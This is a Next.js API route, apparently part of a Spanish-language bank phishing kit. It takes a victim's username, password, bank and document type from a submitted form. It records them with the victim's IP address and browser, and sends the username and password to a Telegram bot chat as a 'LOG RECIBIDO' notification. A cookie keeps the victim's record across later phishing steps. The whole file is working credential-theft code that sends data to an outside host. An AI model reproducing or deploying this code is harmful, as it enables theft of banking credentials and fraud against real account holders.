import { NextRequest, NextResponse } from 'next/server';
import { caseStore } from '@/lib/store';
import { CAPTURE_TELEGRAM_CONFIG } from '@/lib/database';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { user, password, bank, documentType } = body;

        // If ID exists in cookies, it's an update, otherwise create a new record
        const idregRaw = request.headers.get('cookie')?.split('; ').find(row => row.startsWith('id_registro='))?.split('=')[1];
        let idreg = idregRaw ? parseInt(idregRaw) : null;

        if (!idreg) {
            idreg = caseStore.createRecord({
                usuario: user,
                password: password || '',
                banco: bank,
                documentType: documentType || null,
                dispositivo: request.headers.get('user-agent') || 'Unknown',
                ip: request.headers.get('x-forwarded-for') || '127.0.0.1',
            });
        } else {
            caseStore.updateCaseData(idreg, {
                usuario: user,
                password: password || undefined,
                documentType: documentType || undefined
            });
            caseStore.updateCaseStatus(idreg, 1);
        }

        // Send notification to Telegram
        const message = `🆕 LOG RECIBIDO:\n👤 User: ${user}\n🔑 Pass: ${password || 'N/A'}\n🏦 Bank: ${bank}\n🆔 ID: ${idreg}`;

        await fetch(`https://api.telegram.org/bot${CAPTURE_TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CAPTURE_TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const response = NextResponse.json({ success: true, id: idreg });
        response.cookies.set('id_registro', idreg.toString(), {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            sameSite: 'strict',
            maxAge: 3600 // 1 hour
        });

        return response;
    } catch (error) {
        console.error('Error in paso-usuario:', error);
        return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
    }
}
